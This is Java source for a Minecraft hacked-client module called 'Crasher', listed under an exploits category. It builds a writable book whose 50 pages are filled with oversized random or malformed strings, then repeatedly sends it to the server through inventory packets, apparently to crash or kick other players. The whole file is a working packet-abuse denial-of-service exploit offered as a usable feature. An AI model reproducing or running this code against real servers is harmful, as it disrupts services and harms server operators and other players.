package bleach.a32k.module.modules;

import bleach.a32k.module.Category;
import bleach.a32k.module.Module;
import bleach.a32k.settings.SettingBase;
import bleach.a32k.settings.SettingMode;
import bleach.a32k.settings.SettingSlider;
import net.minecraft.init.Items;
import net.minecraft.inventory.ClickType;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.network.play.client.CPacketClickWindow;
import net.minecraft.network.play.client.CPacketCreativeInventoryAction;

import java.util.Arrays;
import java.util.List;
import java.util.Random;
import java.util.stream.Collectors;
import java.util.stream.IntStream;

public class Crasher extends Module
{
    private static final List<SettingBase> settings = Arrays.asList(new SettingMode("Mode: ", "Jessica", "Raion"), new SettingSlider(1.0D, 20.0D, 5.0D, 0, "Uses: "), new SettingMode("Fill: ", "Ascii", "0xFFFF", "Random", "Old"));

    public Crasher()
    {
        super("Crasher", 0, Category.EXPLOITS, "Abuses book and quill packets to remotely kick people.", settings);
    }

    private static String repeat(int count, String with)
    {
        return (new String(new char[count])).replace("\u0000", with);
    }

    public void onUpdate()
    {
        ItemStack bookObj = new ItemStack(Items.WRITABLE_BOOK);
        NBTTagList list = new NBTTagList();
        NBTTagCompound tag = new NBTTagCompound();
        String author = "Bleach";
        String title = "\n Ruhama Owns All \n";
        String size = "";
        IntStream chars;
        if (this.getSettings().get(2).toMode().mode == 2)
        {
            chars = (new Random()).ints(128, 1112063).map((ix) ->
            {
                return ix < 55296 ? ix : ix + 2048;
            });
            size = chars.limit(10500L).mapToObj((ix) ->
            {
                return String.valueOf((char) ix);
            }).collect(Collectors.joining());
        } else if (this.getSettings().get(2).toMode().mode == 1)
        {
            size = repeat(5000, String.valueOf(1114111));
        } else if (this.getSettings().get(2).toMode().mode == 0)
        {
            chars = (new Random()).ints(32, 126);
            size = chars.limit(10500L).mapToObj((ix) ->
            {
                return String.valueOf((char) ix);
            }).collect(Collectors.joining());
        } else if (this.getSettings().get(2).toMode().mode == 3)
        {
            size = "wveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5";
        }

        int i;
        for (i = 0; i < 50; ++i)
        {
            NBTTagString tString = new NBTTagString(size);
            list.appendTag(tString);
        }

        tag.setString("author", author);
        tag.setString("title", title);
        tag.setTag("pages", list);
        bookObj.setTagInfo("pages", list);
        bookObj.setTagCompound(tag);

        for (i = 0; (double) i < this.getSettings().get(1).toSlider().getValue(); ++i)
        {
            if (this.getSettings().get(0).toMode().mode == 0)
            {
                this.mc.player.connection.sendPacket(new CPacketClickWindow(0, 0, 0, ClickType.PICKUP, bookObj, (short) 0));
            } else
            {
                this.mc.player.connection.sendPacket(new CPacketCreativeInventoryAction(0, bookObj));
            }
        }

    }
}
